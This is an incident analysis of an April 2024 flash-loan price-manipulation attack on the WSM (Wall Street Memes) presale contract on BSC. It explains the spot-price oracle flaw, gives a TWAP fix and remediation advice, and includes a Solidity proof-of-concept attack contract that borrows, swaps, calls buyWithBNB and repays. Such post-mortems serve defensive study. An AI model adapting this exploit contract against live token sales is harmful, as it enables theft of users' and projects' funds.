# WSM — buyWithBNB Flash Loan Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | WSM (Wall Street Memes) |
| **Chain** | BSC |
| **Loss** | ~$18,000 |
| **Attacker** | [0x3026C464](https://bscscan.com/address/0x3026C464d3Bd6Ef0CeD0D49e80f171b58176Ce32) |
| **Attack Contract** | [0x014eE3c3](https://bscscan.com/address/0x014eE3c3dE6941cb0202Dd2b30C89309e874B114) |
| **Vulnerable Contract** | [WSM Presale 0xc0afd0e4](https://bscscan.com/address/0xc0afd0e40bb3dcaebd9451aa5c319b745bf792b4) |
| **Root Cause** | `buyWithBNB()` uses Uniswap V3 spot price as a price oracle without TWAP, allowing an attacker to depress the price via a large single-block swap and then buy at the manipulated low price |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/WSM_exp.sol) |

---

## 1. Vulnerability Overview

The `buyWithBNB()` function of the WSM presale contract references the spot price of a Uniswap V3 pool to calculate the WSM amount issued per BNB. The attacker borrowed a large amount of WSM via a V3 flash loan and sold it for BNB, depressing the WSM price. By calling `buyWithBNB()` at the manipulated low price, the attacker received an excessive amount of WSM. The attacker then sold the received WSM back to BNB to realize profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: buyWithBNB uses V3 spot price
contract WSMPresale {
    IUniswapV3Pool public pool;

    function buyWithBNB(uint256 minTokens, bool usePool) external payable {
        // Calculate WSM amount using V3 spot price
        uint256 wsmPrice = getSpotPrice();  // ← manipulable
        uint256 wsmAmount = msg.value * 1e18 / wsmPrice;
        require(wsmAmount >= minTokens, "slippage");
        WSM.transfer(msg.sender, wsmAmount);
    }

    function getSpotPrice() internal view returns (uint256) {
        // Spot price based on V3 pool sqrtPriceX96
        (uint160 sqrtPriceX96,,,,,,) = pool.slot0();
        return calculatePrice(sqrtPriceX96);  // ← manipulable via flash loan
    }
}

// ✅ Safe code: use TWAP-based price
function getPrice() internal view returns (uint256) {
    // 30-minute TWAP
    uint32[] memory secondsAgos = new uint32[](2);
    secondsAgos[0] = 1800; secondsAgos[1] = 0;
    (int56[] memory tickCumulatives,) = pool.observe(secondsAgos);
    int56 tickDiff = tickCumulatives[1] - tickCumulatives[0];
    int24 avgTick  = int24(tickDiff / 1800);
    return getPrice(avgTick);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: WSM_decompiled.sol
contract WSM {
    function buyWithBNB(uint256 p0, bool p1) external {}  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] V3 Flash Loan: borrow 5,000,000 WSM (10000 fee pool)
  │
  ├─→ [2] Swap WSM → BNB (3000 fee pool)
  │         └─ WSM price drops (spot price manipulated)
  │
  ├─→ [3] Convert WBNB → BNB
  │
  ├─→ [4] Call buyWithBNB{value: BNB}(0, false)
  │         └─ Manipulated low WSM price → receive excess WSM
  │
  ├─→ [5] Swap received WSM → BNB
  │
  ├─→ [6] Repay V3 flash loan (WSM + fee)
  │
  └─→ [7] ~$18K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IWSMPresale {
    function buyWithBNB(uint256 minTokens, bool usePool) external payable;
}

interface IUniV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniV3Router {
    struct ExactInputSingleParams {
        address tokenIn; address tokenOut; uint24 fee;
        address recipient; uint256 deadline;
        uint256 amountIn; uint256 amountOutMinimum; uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata params) external returns (uint256);
}

contract AttackContract {
    IWSMPresale  constant presale  = IWSMPresale(0xc0afd0e40bb3dcaebd9451aa5c319b745bf792b4);
    IUniV3Pool   constant v3Pool10k = IUniV3Pool(/* WSM V3 10000 fee pool */);
    IUniV3Router constant router    = IUniV3Router(/* Uniswap V3 Router */);
    IERC20 constant WSM  = IERC20(/* WSM token */);
    IWETH  constant WBNB = IWETH(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function testExploit() external {
        // [1] Flash loan 5M WSM
        v3Pool10k.flash(address(this), 5_000_000e18, 0, "");
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        // [2] Sell WSM → WBNB (price manipulation)
        uint256 wsmBal = WSM.balanceOf(address(this));
        WSM.approve(address(router), wsmBal);
        uint256 wbnbOut = router.exactInputSingle(IUniV3Router.ExactInputSingleParams({
            tokenIn: address(WSM), tokenOut: address(WBNB),
            fee: 3000, recipient: address(this), deadline: block.timestamp,
            amountIn: wsmBal, amountOutMinimum: 0, sqrtPriceLimitX96: 0
        }));

        // [3] WBNB → BNB
        WBNB.withdraw(wbnbOut);

        // [4] Call buyWithBNB at manipulated low WSM price
        presale.buyWithBNB{value: address(this).balance}(0, false);

        // [5] Swap received WSM → WBNB
        uint256 newWsm = WSM.balanceOf(address(this));
        uint256 wsmRepay = 5_000_000e18 + fee0;
        // Sell remaining WSM after repayment
        WSM.approve(address(router), newWsm - wsmRepay);
        router.exactInputSingle(IUniV3Router.ExactInputSingleParams({
            tokenIn: address(WSM), tokenOut: address(WBNB),
            fee: 3000, recipient: address(this), deadline: block.timestamp,
            amountIn: newWsm - wsmRepay, amountOutMinimum: 0, sqrtPriceLimitX96: 0
        }));

        // [6] Repay V3 flash loan
        WSM.transfer(address(v3Pool10k), wsmRepay);
    }

    receive() external payable {}
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Flash loan-based spot price manipulation |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **Attack Vector** | External (V3 flash loan + buyWithBNB spot price manipulation) |
| **DApp Category** | Token presale contract |
| **Impact** | Excess presale token issuance (~$18K) |

## 6. Remediation Recommendations

1. **Use TWAP Oracle**: Replace the price in `buyWithBNB()` with a 30-minute TWAP
2. **Per-Transaction Purchase Cap**: Set a maximum purchase limit per single transaction
3. **Strengthen Slippage Protection**: Validate minimum received amount against TWAP-based price
4. **Price Deviation Circuit Breaker**: Block trades if spot price deviates more than 5% from TWAP

## 7. Lessons Learned

- Directly referencing DEX spot prices in presale contracts is vulnerable to flash loan price manipulation.
- The same spot-price dependency pattern seen in ZongZi (2024-03) and BurnsDefi (2024-02) continues to recur.
- Token sale prices should be isolated from market manipulation by using external oracles (Chainlink, TWAP) or fixed pricing.